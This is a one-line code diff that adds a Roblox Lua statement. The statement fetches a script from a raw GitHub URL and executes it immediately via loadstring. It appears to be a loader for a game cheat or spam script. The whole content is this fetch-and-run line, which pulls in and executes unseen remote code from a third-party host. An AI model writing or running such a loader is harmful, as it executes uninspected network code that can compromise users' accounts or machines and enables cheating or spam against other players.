@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/bunker-vs-verity-spam4-9ztmtykjjnn0p3.lua"))()
